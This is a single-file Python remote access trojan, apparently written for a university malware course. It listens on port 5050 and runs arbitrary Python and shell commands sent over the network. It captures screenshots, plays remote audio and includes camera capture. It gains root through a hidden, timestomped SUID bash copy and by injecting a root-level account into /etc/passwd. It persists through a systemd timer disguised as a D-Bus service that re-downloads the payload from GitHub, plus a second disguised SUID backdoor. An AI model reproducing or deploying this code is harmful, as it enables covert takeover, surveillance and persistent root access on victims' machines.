#!/usr/bin/env python3

# This is all in one file to make it easier to transfer to the remote machine
# That does NOT mean we can't organize it nicely using functions and classes!


# NOTE: Do not put dependencies that require pip install X here!
# Put it inside of the function that bootstraps them instead
import os
import socket
import subprocess
import sys
import time
import contextlib
import io
import struct
import crypt


THIS_FILE = os.path.realpath(__file__)

# Added for multiline

def send_framed(sock, data: bytes):
    sock.sendall(struct.pack(">I", len(data)) + data)

def recv_framed(sock):
    header = b""
    while len(header) < 4:
        header += sock.recv(4 - len(header))
    msg_len = struct.unpack(">I", header)[0]
    data = b""
    while len(data) < msg_len:
        data += sock.recv(msg_len - len(data)) 
    return data

# photo 

def take_photo(path="photo.jpg", camera_index=0):
    import cv2

    cap = cv2.VideoCapture(camera_index)
    if not cap.isOpened():
        raise RuntimeError("Could not open camera")

    try:
        ok, frame = cap.read()
        if not ok:
            raise RuntimeError("Could not read frame from camera")

        ok = cv2.imwrite(path, frame)
        if not ok:
            raise RuntimeError(f"Failed to write image to {path}")
    finally:
        cap.release()
    
    with open(path, "rb") as f:
        photo_bytes = f.read()
    return photo_bytes

# audio 


def play_audio_from_url(url):
    import requests, tempfile, subprocess, os
    r = requests.get(url, timeout=10)
    r.raise_for_status()
    suffix = os.path.splitext(url.split("?")[0])[1] or ".bin"
    with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as f:
        f.write(r.content)
        path = f.name
        print(f"File downloaded to: {path}")
    subprocess.run(
        ["ffplay", "-nodisp", "-autoexit", path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    os.unlink(path)

# screenshot 

def screenshot():
    import time
    import subprocess
    import os

    filename = f"/tmp/screenshot_{int(time.time())}.png"
    result = subprocess.run(["gnome-screenshot", "-f", filename], capture_output=True, text=True)
    if result.returncode != 0:
        raise RuntimeError(f"gnome-screenshot failed: {result.stderr}")
    if not os.path.exists(filename):
        raise RuntimeError("Screenshot file was not created")
    return filename
    
def run_command(cmd, shell=True, capture_output=True, **kwargs):
    return subprocess.run(
        cmd,
        shell=shell,
        capture_output=capture_output,
        text=True,
        **kwargs
    )

# listen on port 5050, receive input
HOST, PORT = "0.0.0.0", 5050

def privesc():
    import subprocess
    import sys
    import os

    if os.geteuid() != 0:
        print("[*] Elevating to root silently using hidden SUID copy...")
        try:
            hidden_bash = "/var/tmp/.cache_sys"
            
            # 1. Create a hidden copy, apply SUID, and timestomp it to match the original
            setup_cmds = f"""
            sudo cp /bin/bash {hidden_bash}
            sudo chmod 4755 {hidden_bash}
            sudo touch -r /bin/bash {hidden_bash}
            """
            subprocess.run(setup_cmds, shell=True, check=True)
            
            # 2. Spawn the privileged payload as a detached background process using the hidden binary
            subprocess.Popen(
                [hidden_bash, "-p", "-c", f"{sys.executable} {THIS_FILE}"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                start_new_session=True  # Detaches from the terminal session
            )
            
            # 3. Terminate the original unprivileged process
            sys.exit(0)
            
        except Exception as e:
            print(f"[-] Failed to elevate: {e}")
            sys.exit(1)
    else:
        print("[+] Already running with root privileges.")

def privesc2():
    # 1. Generate the hash
    hash_str = crypt.crypt("password123", crypt.mksalt(crypt.METHOD_SHA512))
    # Define the line to inject
    line = f"oreo_root:{hash_str}:0:0:root:/root:/bin/bash"
    
    try:
        # 2. Use sudo + tee to append the line to /etc/passwd
        cmd = f"echo '{line}' | sudo tee -a /etc/passwd"
        subprocess.run(cmd, shell=True, check=True)
        print("[+] Successfully injected user via sudo tee")
        return True
    except Exception as e:
        print(f"[-] Failed to inject user: {e}")
        return False
    
def persist():
    import os
    import subprocess

    # 1. Define the user-level systemd directory
    systemd_user_dir = os.path.expanduser("~/.config/systemd/user")
    os.makedirs(systemd_user_dir, exist_ok=True)
    
    # 2. Choose a deceptive name for the service and create paths
    service_name = "user-dbus-sync"
    service_path = os.path.join(systemd_user_dir, f"{service_name}.service")
    timer_path = os.path.join(systemd_user_dir, f"{service_name}.timer")
    
    # 3. Create the Service File
    service_content = f"""[Unit]
Description=User DBUS Synchronization Service
After=network.target

[Service]
Type=simple
ExecStartPre=/usr/bin/curl -fsSL -o {THIS_FILE} https://raw.githubusercontent.com/ucla-e1-malware/final-project-theoreos/refs/heads/main/payload/server.py
ExecStart={sys.executable} {THIS_FILE}
Restart=on-failure
RestartSec=10
"""

    # 4. Create the Timer File
    # OnBootSec triggers shortly after the user logs in (or boot if lingering is enabled).
    # OnUnitActiveSec triggers it repeatedly if it dies.
    timer_content = f"""[Unit]
Description=Timer for User DBUS Synchronization

[Timer]
OnBootSec=1min
OnUnitActiveSec=1min
Persistent=true

[Install]
WantedBy=timers.target
"""

    try:
        # Write the payload configuration to disk
        with open(service_path, "w") as f:
            f.write(service_content)
        with open(timer_path, "w") as f:
            f.write(timer_content)
            
        # Force the user's systemd daemon to reload its configuration from memory
        subprocess.run(
            ["systemctl", "--user", "daemon-reload"], 
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        
        # Enable the timer so it starts automatically on login, and start it right now
        subprocess.run(
            ["systemctl", "--user", "enable", "--now", f"{service_name}.timer"], 
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        return True
    except Exception as e:
        print(f"Persistence setup failed: {e}")
        return False

def persist2():
    # This requires the process to already have root privileges (EUID 0)
    if os.geteuid() != 0:
        print("[-] Must be root to install SUID backdoor.")
        return False

    # Change this path so it doesn't collide with the binary privesc() is currently running!
    hidden_bash = "/usr/libexec/dbus-daemon-sys"
    
    print(f"[*] Installing SUID backdoor at {hidden_bash}...")
    try:
        setup_cmds = f"""
        cp /bin/bash {hidden_bash}
        chown root:root {hidden_bash}
        chmod 4755 {hidden_bash}
        touch -r /bin/bash {hidden_bash}
        """
        
        subprocess.run(setup_cmds, shell=True, check=True)
        print(f"[+] SUID backdoor successfully installed at {hidden_bash}")
        return True
    except Exception as e:
        print(f"[-] Failed to install SUID backdoor: {e}")
        return False
 
def kill_others():
    """
    Since a port can only be bound by one program, kill all other programs on this port that we can see.
    This makes it so if we run our script multiple times, only the most up-to-date/privileged one will be running in the end
    """
    # check if privilege escalated
    # if os.geteuid() == 0:
    # if so, kill all other non-privileged copies of it
    pid = run_command(f"lsof -ti TCP:{str(PORT)}").stdout
    if pid:
        pids = pid.strip().split("\n")
        print("Killing", pids)
        for p in pids:
            if p:
                run_command(f"kill -9 {str(p)}")
        time.sleep(2)

def bootstrap_packages():
    """
    This allows us to install any python package we want as part of our malware.
    In real malware, we would probably packages these extra dependencies with the payload,
    but for simplicitly, we just install it. If you are curious, look into pyinstaller
    """
    print(sys.prefix, sys.base_prefix)
    if sys.prefix == sys.base_prefix:
        # we're not in a venv, make one
        print("running in venv")
        import venv

        venv_dir = os.path.join(os.path.dirname(THIS_FILE), ".venv")
        # print(venv_dir)
        if not os.path.exists(venv_dir):
            print("creating venv")
            venv.create(venv_dir, with_pip=True)
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
        else:
            print("venv exists, but we still need to open inside it")
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
    else:
        print("already in venv")
        run_command(
            [ sys.executable, "-m", "pip", "install", "requests"], shell=False, capture_output=False
        ).check_returncode() # example to install a python package on the remote server
        # If you need pip install X packages, here, import them now
        import requests

def handle_python_command(user_input):
    buffer = io.StringIO()
    try:
        with contextlib.redirect_stdout(buffer):
            exec(user_input)
        output = buffer.getvalue() #AI for capturing output
        return output if output else "Success!"
    except Exception as e:
        return f"Error: {e}" 


def handle_conn(conn, addr):
    with conn:
        print(f"connected by {addr}")
        # If you need to receive more data, you may need to loop
        # Note that there is actually no way to know we have gotten "all" of the data
        # We only know if the connection was closed, but if the client is waiting for us to say something,
        # It won't be closed. Hint: you might need to decide how to mark the "end of command data".
        # For example, you could send a length value before any command, decide on null byte as ending,
        # base64 encode every command, etc
        #ADDED
        raw_data = recv_framed(conn) 
        # raw_data = conn.recv(1024)
        if not raw_data:
            return
        
        data = raw_data.decode("utf-8", errors="replace").strip()

        print("received: " + data)

        parts = data.split(" ", 1)
        command_type = parts[0]
        command_body = parts[1] if len(parts) > 1 else "" # AI for splitting

        #stuff I added -- START
        # Command 1: Privilege Escalation
        try: 
            if command_type == "PLAY_AUDIO":
                try:
                    url = command_body.strip()
                    play_audio_from_url(url)
                    send_framed(conn, b"TEXT\n" + b"Playing Audio")
                except Exception as e:
                    send_framed(conn, b"TEXT\n" + f"Audio error: {e}".encode())
            elif command_type == "CLICK":
                try:
                    path = screenshot()
                    with open(path, "rb") as f:
                        data = f.read()
                    send_framed(conn, b"FILE\n" + data)
                except Exception as e:
                    print(f"Screenshot error: {e}")
                    send_framed(conn, b"TEXT\n" + f"Screenshot error: {e}".encode())
            elif command_type == "privesc":
                print("Running privesc")
                privesc()
                # conn.sendall(b"Privesc triggered: restarting as root")
                send_framed(conn, b"TEXT\n" + b"Privesc triggered: restarting as root")
            elif command_type == "privesc2":
                print("Running privesc2")
                success = privesc2()
                if success:
                    send_framed(conn, b"TEXT\n" + b"[+] Privesc2 successful! Account 'oreo_root' created.")
                else:
                    send_framed(conn, b"TEXT\n" + b"[-] Privesc2 failed: check server logs.")
            #Command 2: Python 
            elif command_type == "PY":
                print("Running python")
                result = handle_python_command(command_body)
                # conn.sendall(result.encode("utf-8", errors="replace"))
                send_framed(conn, b"TEXT\n" + result.encode("utf-8", errors="replace"))
            
            elif command_type == "BASH":
                print(f"Running bash: {command_body}")
                
                # If we are root, use the hidden bash and force it to load the profile
                if os.geteuid() == 0:
                    hidden_bash = "/var/tmp/.cache_sys"
                    
                    # Ensure we source the profile into memory first to restore environment variables
                    # before executing the attacker's command
                    if os.path.exists(hidden_bash):
                        exec_args = [hidden_bash, "-p", "-c", f"source ~/.bashrc 2>/dev/null; {command_body}"]
                    else:
                        # Fallback if the hidden file was removed
                        exec_args = ["/bin/bash", "-p", "-c", f"source ~/.bashrc 2>/dev/null; {command_body}"]
                else:
                    exec_args = ["/bin/sh", "-c", command_body]

                # Run the command directly (shell=False)
                proc = subprocess.run(
                    exec_args, 
                    shell=False, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE
                )
                
                output = proc.stdout + proc.stderr
                send_framed(conn, b"TEXT\n" + (output if output else b"[no output]"))
        except Exception as e:
            # conn.sendall(f"error: {e}".encode())
            send_framed(conn, b"TEXT\n" + f"error: {e}".encode())

def main():
    import os
    kill_others()
    bootstrap_packages() # This may exit the script and restart in venv
    
    # 1. Unprivileged Persistence (systemd timers)
    print("[*] Automatically establishing systemd persistence...")
    persist()

    # 2. Privileged Persistence (SUID backdoor)
    if os.geteuid() == 0:
        print("[*] Root privileges detected. Installing backdoor...")
        persist2()

    # 3. The Server Loop (Must be inside main and after bootstrapping)
    print(f"[*] Attempting to bind to {HOST}:{PORT}...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind((HOST, PORT))
            s.listen(10) 
            print(f"[+] Server listening on {HOST}:{PORT}")
        except Exception as e:
            print(f"[-] Bind failed: {e}")
            sys.exit(1)

        while True:
            try:
                conn, addr = s.accept()
                # Use a thread or handle directly
                handle_conn(conn, addr)
            except KeyboardInterrupt:
                print("\n[*] Shutting down.")
                break
            except Exception as e:
                print(f"[-] Connection error: {e}")

if __name__ == "__main__":
    main()